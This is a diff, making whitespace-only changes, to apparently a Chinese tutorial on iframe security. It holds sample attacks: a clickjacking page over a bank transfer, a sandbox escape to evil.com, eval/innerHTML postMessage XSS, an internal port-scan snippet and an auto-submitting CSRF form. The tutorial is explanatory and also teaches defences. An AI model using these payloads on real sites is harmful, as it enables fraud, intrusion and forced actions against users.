@@ -66,31 +66,31 @@ CSP的`frame-ancestors`替代了X-Frame-Options，更灵活：
 <html>
 <head>
 <style>
-  #target-frame {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 800px;
-    height: 600px;
-    opacity: 0.001;     /* 几乎完全透明 */
-    z-index: 2;
-  }
-  #decoy {
-    position: absolute;
-    top: 100px;
-    left: 100px;
-    z-index: 1;
-  }
+ #target-frame {
+ position: absolute;
+ top: 0;
+ left: 0;
+ width: 800px;
+ height: 600px;
+ opacity: 0.001; /* 几乎完全透明 */
+ z-index: 2;
+ }
+ #decoy {
+ position: absolute;
+ top: 100px;
+ left: 100px;
+ z-index: 1;
+ }
 </style>
 </head>
 <body>
-  <div id="decoy">
-    <button>点击赢取iPhone!</button>
-  </div>
-  <iframe id="target-frame"
-    src="https://bank.com/transfer?to=attacker&amount=10000"
-    scrolling="no">
-  </iframe>
+ <div id="decoy">
+ <button>点击赢取iPhone!</button>
+ </div>
+ <iframe id="target-frame"
+ src="https://bank.com/transfer?to=attacker&amount=10000"
+ scrolling="no">
+ </iframe>
 </body>
 </html>
 ```
@@ -111,7 +111,7 @@ CSP的`frame-ancestors`替代了X-Frame-Options，更灵活：
 ```
 // JS防御（Frame Busting）
 if (top !== self) {
-    top.location = self.location;  // 跳出iframe
+ top.location = self.location; // 跳出iframe
 }
 
 // 但是Frame Busting也可能被绕过：
@@ -169,7 +169,7 @@ if (top !== self) {
 ```html
 <!-- 危险：allow-scripts + allow-same-origin = 可突破沙箱 -->
 <iframe sandbox="allow-scripts allow-same-origin"
-  srcdoc="<script>top.location='https://evil.com'</script>">
+ srcdoc="<script>top.location='https://evil.com'</script>">
 </iframe>
 ```
 
@@ -199,9 +199,9 @@ window.parent.postMessage({type:'response'}, 'https://parent.com');
 
 // 接收端
 window.addEventListener('message', function(event) {
-    // 必须验证 origin
-    if (event.origin !== 'https://trusted.com') return;
-    console.log(event.data);
+ // 必须验证 origin
+ if (event.origin !== 'https://trusted.com') return;
+ console.log(event.data);
 });
 ```
 
@@ -219,8 +219,8 @@ window.parent.postMessage(sensitiveData, 'https://trusted.com');
 **漏洞2：未验证event.origin**
 ```javascript
 window.addEventListener('message', function(e) {
-    // 危险 —— 接受任何来源的消息
-    eval(e.data);  // DOM XSS
+ // 危险 —— 接受任何来源的消息
+ eval(e.data); // DOM XSS
 });
 ```
 
@@ -228,9 +228,9 @@ window.addEventListener('message', function(e) {
 ```javascript
 // 如果消息处理器不安全地处理e.data：
 window.addEventListener('message', function(e) {
-    document.getElementById('content').innerHTML = e.data;
-    // 攻击者从evil.com发送：
-    // postMessage('<img src=x onerror=alert(1)>', '*')
+ document.getElementById('content').innerHTML = e.data;
+ // 攻击者从evil.com发送：
+ // postMessage('<img src=x onerror=alert(1)>', '*')
 });
 ```
 
@@ -242,8 +242,8 @@ window.addEventListener('message', function(e) {
 
 ```html
 <img src="http://192.168.1.1:8080/favicon.ico" 
-     onload="log('192.168.1.1:8080 OPEN')" 
-     onerror="log('192.168.1.1:8080 CLOSED')">
+ onload="log('192.168.1.1:8080 OPEN')" 
+ onerror="log('192.168.1.1:8080 CLOSED')">
 ```
 
 ### 2. C2隐藏通信
@@ -259,8 +259,8 @@ window.addEventListener('message', function(e) {
 ```html
 <iframe name="hiddenFrame" style="display:none"></iframe>
 <form action="https://target.com/api/deleteUser" method="POST" 
-      target="hiddenFrame">
-  <input type="hidden" name="userId" value="1">
+ target="hiddenFrame">
+ <input type="hidden" name="userId" value="1">
 </form>
 <script>document.forms[0].submit();</script>
 ```
